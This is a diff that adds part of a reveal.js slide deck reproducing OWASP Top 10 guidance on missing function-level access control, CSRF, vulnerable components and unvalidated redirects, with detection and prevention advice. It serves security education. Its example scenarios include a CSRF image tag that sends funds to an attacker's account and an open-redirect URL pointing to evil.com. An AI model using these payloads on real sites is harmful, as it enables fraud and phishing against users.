+                </li>
+                <li> The enforcement mechanism(s) should deny all access by default, requiring explicit grants to specific roles for access to every function.
+                </li>
+                <li> If the function is involved in a workflow, check to make sure the conditions are in the proper state to allow access.
+                </li>
+              </ol>
+              <small>NOTE: Most web applications don’t display links and buttons to unauthorized functions, but this “presentation layer access control” doesn’t actually provide protection. You must also implement checks in the controller or business logic.
+              </small>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Example Scenarios</h2>
+              <p>
+                <u>Scenario #1:</u> The attacker simply opens the target URLs. The following URLs require authentication. Admin rights are also required for access to the “admin_getappInfo” page.
+              </p>
+              <pre>
+                <code data-trim contenteditable>
+                  http://example.com/app/getappInfo
+                </code>
+              </pre>
+              <pre>
+                <code data-trim contenteditable>
+                  http://example.com/app/admin_getappInfo
+                </code>
+              </pre>
+              <p>If an unauthenticated user can  access either page, that’s a flaw. If an authenticated, non-admin, user is allowed to access the “admin_getappInfo” page, this is also a flaw, and may lead the attacker to more improperly protected admin pages.
+              </p>
+              <p>
+                <u>Scenario #2:</u> A page provides an ‘action ‘parameter to specify the function being invoked, and different actions require different roles. If these roles aren’t enforced, that’s a flaw.
+              </p>
+            </div>
+          </section>
+        </section>
+        <section>
+          <section>
+            <h2>A8-Cross-Site Request Forgery (CSRF)</h2>
+            <div class="owasp">
+              <table class="owasp-table">
+                <tbody>
+                  <tr class="heading">
+                    <th width="16.5%"> Threat Agents</th>
+                    <th width="16.5%"> Attack Vectors</th>
+                    <th width="33%" colspan="2"> Security Weakness</th>
+                    <th width="16.5%"> Technical Impacts</th>
+                    <th width="16.5%"> Business Impacts</th>
+                  </tr>
+                  <tr>
+                    <td class="owasp-none">&nbsp;? </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Exploitability<br> AVERAGE</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Prevalence<br> COMMON</b>
+                    </td>
+                    <td class="owasp-high" width="16.5%">
+                      <b>Detectability<br> EASY</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Impact<br> MODERATE</b>
+                    </td>
+                    <td class="owasp-none">&nbsp;? </td>
+                  </tr>
+                  <tr valign="top">
+                    <td class="owasp-body">Consider anyone who can load content into your users’ browsers, and thus force them to submit a request to your website. Any website or other HTML feed that your users access could do this.
+                    </td>
+                    <td class="owasp-body">Attacker creates forged HTTP requests and tricks a victim into submitting them via image tags, XSS, or numerous other techniques. <u>If the user is authenticated</u>, the attack succeeds.
+                    </td>
+                    <td colspan="2" class="owasp-body">
+                      <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/CSRF">CSRF</a> takes advantage of the fact that most web apps allow attackers to predict all the details of a particular action.
+                      <p>Since browsers send credentials like session cookies automatically, attackers can create malicious web pages which generate forged requests that are indistinguishable from legitimate ones.
+                      </p>
+                      <p>Detection of CSRF flaws is fairly easy via penetration testing or code analysis.
+                      </p>
+                    </td>
+                    <td class="owasp-body">Attackers can cause victims to change any data the victim is allowed to change or perform any other function the victim is authorized to use, including state changing requests, like logout or even login.
+                    </td>
+                    <td class="owasp-body">Consider the business value of the affected data or application functions. Imagine not being sure if users intended to take these actions.
+                      Consider the impact to your reputation.
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Am I Vulnerable To 'Cross-Site Request Forgery (CSRF)'?</h2>
+              <p>
+                See if each link and form includes an unpredictable token. Without such a token, attackers can forge malicious requests.
+                Focus on the links and forms that invoke state-changing functions, since those are the most important CSRF targets.
+                You should check multistep transactions, as they are not inherently immune. Attackers can easily forge a series of requests by using multiple tags or possibly JavaScript.
+                Note that session cookies, source IP addresses, and other information automatically sent by the browser doesn’t count since this information is also included in forged requests.
+                <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/CSRFTester">CSRF Tester</a> tool can help generate test cases to demonstrate the dangers of CSRF flaws.
+              </p>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>How Do I prevent 'Cross-Site Request Forgery (CSRF)'?</h2>
+              <p>Usually include of an unpredictable token in each HTTP request. Tokens should, at a minimum, be unique per user session.
+              </p>
+              <ol>
+                <li> The preferred option is to include the unique token in a hidden field. This causes the value to be sent in the body of the HTTP request, avoiding its inclusion in the URL, which is subject to exposure.
+                </li>
+                <li> The unique token can also be included in the URL itself, or a URL parameter. However, such placement runs the risk that the URL will be exposed to an attacker, thus compromising the secret token.
+                </li>
+                <li> Requiring the user to reauthenticate, or prove they are a user (e.g., via a CAPTCHA) can also protect against CSRF.
+                </li>
+              </ol>
+              <p>OWASP’s <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/CSRFGuard">CSRF Guard</a> can automatically include such tokens in Java EE, .NET, or PHP apps. OWASP’s <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/ESAPI">ESAPI</a> includes CSRF methods developers can use to prevent such vulnerabilities.
+              </p>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Example Scenarios</h2>
+              <p>The application allows a user to submit a state changing request that does not include anything secret. For example:
+              </p>
+              <pre>
+                <code>
+                  http://example.com/app/transferFunds?amount=1500&amp;
+                  destinationAccount=4673243243
+                </code>
+              </pre>
+              <pre>
+                <code>
+                  &lt;img src="
+                  http://example.com/app/transferFunds?amount=1500&amp;
+                  destinationAccount=attackersAcct#&lt;
+                  " width="0" height="0" /&gt;
+                </code>
+              </pre>
+              <small>So, the attacker constructs a request that will transfer money from the victim’s account to their account, and then embeds this attack in an image request or iframe stored on various sites under the attacker’s control like so:
+                If the victim visits any of the attacker’s sites while already authenticated to example.com, these forged requests will automatically include the user’s session info, authorizing the attacker’s request.
+              </small>
+            </div>
+          </section>
+        </section>
+        <section>
+          <section>
+            <h2>A9-Using Components with Known Vulnerabilities</h2>
+            <div class="owasp">
+              <table class="owasp-table">
+                <tbody>
+                  <tr class="heading">
+                    <th width="16.5%"> Threat Agents</th>
+                    <th width="16.5%"> Attack Vectors</th>
+                    <th width="33%" colspan="2"> Security Weakness</th>
+                    <th width="16.5%"> Technical Impacts</th>
+                    <th width="16.5%"> Business Impacts</th>
+                  </tr>
+                  <tr>
+                    <td class="owasp-none">&nbsp;? </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Exploitability<br> AVERAGE</b>
+                    </td>
+                    <td class="owasp-high" width="16.5%">
+                      <b>Prevalence<br> WIDESPREAD</b>
+                    </td>
+                    <td class="owasp-low" width="16.5%">
+                      <b>Detectability<br> DIFFICULT</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Impact<br> MODERATE</b>
+                    </td>
+                    <td class="owasp-none">&nbsp;? </td>
+                  </tr>
+                  <tr valign="top">
+                    <td class="owasp-body">Some vulnerable components (e.g., framework libraries) can be identified and exploited with automated tools, expanding the threat agent pool beyond targeted attackers to include chaotic actors.
+                    </td>
+                    <td class="owasp-body">Attacker identifies a weak component through scanning or manual analysis. They customize the exploit as needed and execute the attack. It gets more difficult if the used component is deep in the application.
+                    </td>
+                    <td colspan="2" class="owasp-body">Virtually every application has these issues because most development teams don’t focus on ensuring their components stay up to date. In many cases,  the developers don’t even know all the components they are using, never mind their versions. Component dependencies make things even worse.
+                    </td>
+                    <td class="owasp-body">The full range of weaknesses is possible, including injection, broken access control, XSS, etc. The impact could be minimal, up to complete host takeover and data compromise.
+                    </td>
+                    <td class="owasp-body">Consider what each vulnerability might mean for the business controlled by the affected application. It could be trivial or it could mean complete compromise.
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Am I Vulnerable To 'Using Components with Known Vulnerabilities'?</h2>
+              <p>In theory, it ought to be easy to figure out if you are currently using any vulnerable components or libraries. Unfortunately, vulnerability reports do not always specify exactly which versions of a component are vulnerable in a standard, searchable way. Further, not all libraries use an understandable version numbering system. Worst of all, not all vulnerabilities are reported to a central clearinghouse that is easy to search, although sites like CVE and NVD are becoming easier to search.
+              </p>
+              <p>Determining if you are vulnerable requires searching these databases, as well as keeping abreast of project mailing lists and announcements for anything that might be a vulnerability. If one of your components does have a vulnerability, you should carefully evaluate whether you are actually vulnerable by checking to see if your code uses the part of the component with the vulnerability and whether the flaw could result in an impact you care about.
+              </p>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>How Do I prevent 'Using Components with Known Vulnerabilities'?</h2>
+              <p>One option is not to use components that you didn’t write. But realistically, the best way to deal with this risk is to ensure that you keep your components up-to-date.
+                Many open source projects (and other component sources) do not create vulnerability patches for old versions. Instead, most simply fix the problem in the next version.
+                Software projects should have a process in place to:
+              </p>
+              <ol>
+                <li> Identify the components and their versions you are using, including all dependencies. (e.g., the versions plugin).
+                </li>
+                <li> Monitor the security of these components in public databases, project mailing lists, and security mailing lists, and keep them up-to-date.
+                </li>
+                <li> Establish security policies governing component use, such as requiring certain software development practices, passing security tests, and acceptable licenses.
+                </li>
+              </ol>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Example Scenarios</h2>
+              <p>The following two vulnerable components were downloaded 22m times in 2011.
+              </p>
+              <ul>
+                <li> <a rel="nofollow" class="external text" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3451">Apache CXF Authentication Bypass</a> – By failing to provide an identity token, attackers could invoke any web service with full permission.
+                </li>
+                <li> <a rel="nofollow" class="external text" href="http://www.infosecurity-magazine.com/view/30282/remote-code-vulnerability-in-spring-framework-for-java/">Spring Remote Code Execution</a>– Abuse of the Expression Language implementation in Spring allowed attackers to execute arbitrary code, effectively taking over the server.
+                </li>
+              </ul>
+              <br><br>
+              <p>Every application using either of these vulnerable libraries is vulnerable to attack as both of these components are directly accessible by application users. Other vulnerable libraries, used deeper in an application, may be harder to exploit.
+              </p>
+            </div>
+          </section>
+        </section>
+        <section>
+          <section>
+            <h2>A10-Unvalidated Redirects and Forwards</h2>
+            <div class="owasp">
+              <table class="owasp-table">
+                <tbody>
+                  <tr class="heading">
+                    <th width="16.5%"> Threat Agents</th>
+                    <th width="16.5%"> Attack Vectors</th>
+                    <th width="33%" colspan="2"> Security Weakness</th>
+                    <th width="16.5%"> Technical Impacts</th>
+                    <th width="16.5%"> Business Impacts</th>
+                  </tr>
+                  <tr>
+                    <td class="owasp-none">&nbsp;? </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Exploitability<br> AVERAGE</b>
+                    </td>
+                    <td class="owasp-low" width="16.5%">
+                      <b>Prevalence<br> UNCOMMON</b>
+                    </td>
+                    <td class="owasp-high" width="16.5%">
+                      <b>Detectability<br> EASY</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Impact<br> MODERATE</b>
+                    </td>
+                    <td class="owasp-none">&nbsp;? </td>
+                  </tr>
+                  <tr valign="top">
+                    <td class="owasp-body">Consider anyone who can trick your users into submitting a request to your website. Any website or other HTML feed that your users use could do this.
+                    </td>
+                    <td class="owasp-body">Attacker links to unvalidated redirect and tricks victims into clicking it. Victims are more likely to click on it, since the link is to a valid site. Attacker targets unsafe forward to bypass security checks.
+                    </td>
+                    <td colspan="2" class="owasp-body">Applications frequently redirect users to other pages, or use internal forwards in a similar manner. Sometimes the target page is specified in an unvalidated parameter, allowing attackers to choose the destination page.
+                      <p>Detecting unchecked redirects is easy. Look for redirects where you can set the full URL. Unchecked forwards are harder, since they target internal pages.
+                      </p>
+                    </td>
+                    <td class="owasp-body">Such redirects may attempt to install malware or trick victims into disclosing passwords or other sensitive information. Unsafe forwards may allow access control bypass.
+                    </td>
+                    <td class="owasp-body">Consider the business value of retaining your users’ trust.
+                      <p>What if they get owned by malware?
+                      </p>
+                      <p>What if attackers can access internal only functions?
+                      </p>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Am I Vulnerable To 'Unvalidated Redirects and Forwards'?</h2>
+              <ol>
+                <li> Review the code for all uses of redirect or forward (called a transfer in .NET). For each use, identify if the target URL is included in any parameter values. If so, verify the parameter(s) are validated to contain only an allowed destination, or element of a destination.
+                </li>
+                <li> Also, spider the site to see if it generates any redirects (HTTP response codes 300-307, typically 302). Look at the parameters supplied prior to the redirect to see if they appear to be a target URL or a piece of such a URL. If so, change the URL target and observe whether the site redirects to the new target.
+                </li>
+                <li> If code is unavailable, check all parameters to see if they look like part of a redirect or forward URL destination and test those that do.
+                </li>
+              </ol>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>How Do I prevent 'Unvalidated Redirects and Forwards'?</h2>
+              <p>Safe use of redirects and forwards can be done in a number of ways:
+              </p>
+              <ol>
+                <li> Don’t involve user parameters in calculating the destination.
+                </li>
+                <li> If destination parameters can’t be avoided, ensure that the supplied value is valid, and authorized for the user.<br>
+                  - It is recommended that any such destination parameters be a <b>mapping value</b>, rather than the actual URL or portion of the URL, and that server side code translate this mapping to the target URL.<br>
+                  - Applications can use ESAPI to override the sendRedirect() method to make sure all redirect destinations are safe.
+                </li>
+              </ol>
+              <br><br>
+              <p>Avoiding such flaws is extremely important as they are a favorite target of phishers trying to gain the user’s trust.
+              </p>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Example Scenarios</h2>
+              <p>
+                <u>Scenario #1:</u> The application has a page called “redirect.jsp” which takes a single parameter named “url”. The attacker crafts a malicious URL that redirects users to a malicious site that performs phishing and installs malware.
+              </p>
+              <pre>
+                <code>
+                  http://www.example.com/redirect.jsp?url=evil.com
+                </code>
+              </pre>
+              <p>
+                <u>Scenario #2:</u> The application uses forwards to route requests between different parts of the site. To facilitate this, some pages use a parameter to indicate where the user should be sent if a transaction is successful. In this case, the attacker crafts a URL that will pass the application’s access control check and then forwards the attacker to an administrative function that she would not normally be able to access.
+              </p>
+              <pre>
+                <code>
+                  http://www.example.com/boring.jsp?fwd=admin.jsp
+                </code>
+              </pre>
+            </div>
+          </section>
+        </section>
+
+
+
+
+
+
+
+
+
+      </div>
+
+    </div>
+
+    <script src="lib/js/head.min.js"></script>
+    <script src="js/reveal.js"></script>
+
+    <script>
+
+      // Full list of configuration options available at:
+      // https://github.com/hakimel/reveal.js#configuration
+      Reveal.initialize({
+        controls: true,
+        progress: true,
+        history: true,
+        center: true,
+
+        transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+        // Optional reveal.js plugins
+        dependencies: [
+          { src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+          { src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+          { src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+          { src: 'plugin/highlight/highlight.js', async: true, condition: function() { return !!document.querySelector( 'pre code' ); }, callback: function() { hljs.initHighlightingOnLoad(); } },
+          { src: 'plugin/zoom-js/zoom.js', async: true },
+          { src: 'plugin/notes/notes.js', async: true }
+        ]
+      });
+
+    </script>
+
+  </body>
+</html>
